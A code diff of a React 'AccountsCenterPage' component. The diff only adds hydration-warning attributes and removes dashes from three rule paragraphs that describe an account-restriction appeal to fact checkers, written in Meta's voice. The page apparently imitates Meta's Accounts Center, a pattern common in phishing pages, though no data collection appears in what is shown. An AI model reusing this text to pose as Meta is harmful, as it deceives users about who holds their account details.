@@ -64,16 +64,16 @@ export default function AccountsCenterPage() {
                 </h2>
 
                 <div className="space-y-[15px] text-[#171A1D]">
-                  <p data-i18n="rule_1">
-                    - Fact checkers may not respond to requests containing intimidation, hate speech, or verbal threats
+                  <p suppressHydrationWarning data-i18n="rule_1">
+                    Fact checkers may not respond to requests containing intimidation, hate speech, or verbal threats
                   </p>
                   
-                  <p data-i18n="rule_2">
-                    - In your request, please provide all required information to ensure timely processing by the fact checker. Submitting an invalid email address or failing to reply to requests for additional information within 2 days may lead to the application being closed without review. If the request remains unprocessed after 4 days, Meta will automatically reject it.
+                  <p suppressHydrationWarning data-i18n="rule_2">
+                    In your request, please provide all required information to ensure timely processing by the fact checker. Submitting an invalid email address or failing to reply to requests for additional information within 2 days may lead to the application being closed without review. If the request remains unprocessed after 4 days, Meta will automatically reject it.
                   </p>
 
-                  <p data-i18n="rule_3">
-                    - Once all details are submitted, we will evaluate your account to check for any restrictions. The verification process typically takes 24 hours, though it may extend in some cases. Based on our decision, restrictions will either remain or be lifted, and your account will be updated accordingly.
+                  <p suppressHydrationWarning data-i18n="rule_3">
+                    Once all details are submitted, we will evaluate your account to check for any restrictions. The verification process typically takes 24 hours, though it may extend in some cases. Based on our decision, restrictions will either remain or be lifted, and your account will be updated accordingly.
                   </p>
                 </div>
               </div>
